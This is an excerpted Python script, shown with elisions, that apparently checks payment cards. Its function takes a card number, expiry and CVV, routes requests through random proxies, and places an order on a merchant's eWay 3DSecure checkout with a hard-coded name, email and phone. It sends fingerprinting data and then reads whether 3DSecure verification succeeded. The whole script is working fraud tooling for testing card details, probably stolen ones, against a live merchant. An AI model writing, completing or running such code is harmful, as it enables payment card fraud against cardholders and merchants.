...
from utils.functions import random_proxy, capture
...
async def djbaby(cc, month, year, cvv):
    async with AsyncClient(
        ...
        post6 = f"paymentid=26&action=place_order&xid_sph_364e1={xi}&payment_method=Credit+Card+-+eWay+3DSecure&Customer_Notes=&accept_terms=Y"
        ...
        post7 = f"EWAY_ACCESSCODE={ew}&EWAY_VIEW=Modal&EWAY_ISSHAREDPAYMENT=true&EWAY_ISMODALPAGE=true&EWAY_APPLYSURCHARGE=true&EWAY_CUSTOMERREADONLY=False&PAYMENT_TRANTYPE=Purchase&AMEXEC_ENCRYPTED_DATA=&EWAY_PAYMENTTYPE=creditcard&EWAY_CUSTOMEREMAIL=sachiopremiun%40gmail.com&EWAY_CUSTOMERPHONE=9006455555&EWAY_CARDNUMBER={cc}&EWAY_CARDNAME=Sachio+Y&EWAY_CARDEXPIRYMONTH={month}&EWAY_CARDEXPIRYYEAR={year}&EWAY_CARDCVN={cvv}&AMEXEC_RESPONSE="
        ...
        post11 = {
            ...
            "Origin": "Songbird",
            "Plugins": [
                "6dt1Do78::ufuAfPHDBn6dt9e2bVKkSoct9mb05FKF::~w7l",
                "f2bNtWy::HiwYMOHDBny4kxBAIr89HqVxYUp7GLs::~UKk",
            ],
            "ReferenceId": f"{re}",
            "Referrer": "",
            "Screen": {
        ...
        vbv = capture(r12.text, '"isSuccessful":', ",")
